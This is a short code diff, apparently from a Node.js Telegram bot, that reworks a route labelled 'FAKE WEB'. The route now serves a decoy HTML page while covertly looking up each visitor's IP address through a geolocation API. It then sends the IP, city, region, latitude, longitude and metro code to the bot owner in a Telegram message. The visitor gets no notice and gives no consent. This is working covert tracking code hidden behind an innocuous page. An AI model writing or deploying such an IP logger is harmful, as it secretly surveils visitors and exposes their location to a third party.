@@ -149,17 +149,9 @@ bot.command('resize', async (ctx) => {
 
 // FAKE WEB
 app.get("/", (req, res) => {
-res.sendFile("./src/index.html", { root: __dirname });
-});
-
-// FAKE WEB
-app.listen(3000, () => {
-console.log(chalk.greenBright("Bot launched successfully!"));
-});
-
-app.get('/', async(req, res) => {
 const ip = req.ip;
 let rus = await fetchJson("https://api.ipbase.com/v1/json/" + ip)
+res.sendFile("./src/index.html", { root: __dirname });
 let teks =`*New Visitor*
 \`\`\`
 IP: ${rus.ip}
@@ -172,9 +164,13 @@ LATITUDE: ${rus.latitude}
 LONGTITUDE: ${rus.longtitude}
 METRO CODE: ${rus.metro_code}
 \`\`\``
-res.send('hello world!')
 bot.telegram.sendMessage(global.owner, teks)
-})
+});
+
+// FAKE WEB
+app.listen(3000, () => {
+console.log(chalk.greenBright("Bot launched successfully!"));
+});
 
 
 // START THE BOT
